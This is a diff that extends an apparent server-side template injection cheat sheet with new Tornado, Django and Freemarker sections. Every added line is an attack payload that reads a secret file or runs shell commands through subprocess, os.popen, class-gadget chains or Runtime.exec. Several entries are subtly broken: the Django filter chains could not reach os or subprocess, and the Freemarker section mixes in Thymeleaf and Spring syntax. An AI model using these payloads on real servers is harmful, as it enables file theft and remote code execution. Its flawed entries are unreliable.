@@ -18,6 +18,37 @@ ByPass:
 {{ config.from_pyfile('/home/vova/secret') }}
 ```
 
+## Python (Tornado)
+
+```
+{{ }}, {% %}, {{7*7}} = 49
+{{ open('/home/vova/secret').read() }}
+```
+
+ByPass:
+```
+{% set subprocess = __import__('subprocess') %}
+{{ subprocess.check_output('cat /home/vova/secret', shell=True) }}
+
+{{ os.environ['HOME'] + '/vova/secret' }}
+
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/vova/secret').read() }}
+```
+
+## Python (Django)
+
+```
+{{ }}, {% %}, {{7*7}} = 49
+{{ ''|add:''|add:''.subprocess.Popen("cat /home/vova/secret", shell=True, stdout=-1).communicate }}
+```
+
+ByPass:
+```
+{{ ''|add:''.os.popen("cat /home/vova/secret").read }}
+{{ ''|add:''.os.getenv("HOME") + "/vova/secret" }}
+{{ ''|add:''.__class__.__mro__[1].__subclasses__()[40]("/home/vova/secret").read() }}
+```
+
 ## Ruby (ERB)
 
 ```
@@ -44,6 +75,20 @@ ByPass:
 ${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/home/vova/secret'))}
 ${new java.util.Scanner(new java.io.File('/home/vova/secret')).useDelimiter("\\A").next()}
 ${new java.io.BufferedReader(new java.io.FileReader('/home/vova/secret')).lines().toArray()}
+```
+
+## Java (Freemarker)
+
+```
+th:text, ${}, ${7*7} = 49
+${T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/home/vova/secret'))?string}
+```
+
+ByPass:
+```
+${new java.util.Scanner(new java.io.File('/home/vova/secret')).useDelimiter("\\A").next()}
+${new java.io.BufferedReader(new java.io.FileReader('/home/vova/secret')).lines().toArray()}
+${T(java.lang.Runtime).getRuntime().exec('cat /home/vova/secret')}
 ```
 
 ## PHP (Smarty)
